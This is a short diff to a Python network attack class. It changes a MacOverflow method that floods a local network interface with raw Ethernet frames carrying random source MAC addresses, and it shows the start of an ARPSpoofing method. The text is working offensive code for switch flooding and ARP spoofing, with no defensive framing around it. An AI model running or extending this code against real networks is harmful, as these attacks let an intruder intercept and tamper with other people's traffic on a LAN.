@@ -5,11 +5,12 @@ from time import sleep
 import socket
 
 class Lan():
-	def MacOverflow(self,iface,numero=0,time=-1):
+	def MacOverflow(self,iface,numero=10000,time=-1):
 		getvalores = General()
 		s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
 		s.bind((iface,0))
-		while numero != 0:
+
+		while numero > 0:
 			numero-=1
 			ethernet = Ethernet()
 			ethernet.src_mac =  getvalores.mac_random()
@@ -18,6 +19,8 @@ class Lan():
 			s.send(ethernet_send)
 			print('src_mac:'+ethernet.src_mac+' dst_mac:'+ethernet.dst_mac )
 		
+
+
 	def ARPSpoofing(self,iface,host1,host2):
 	
 		general = General()
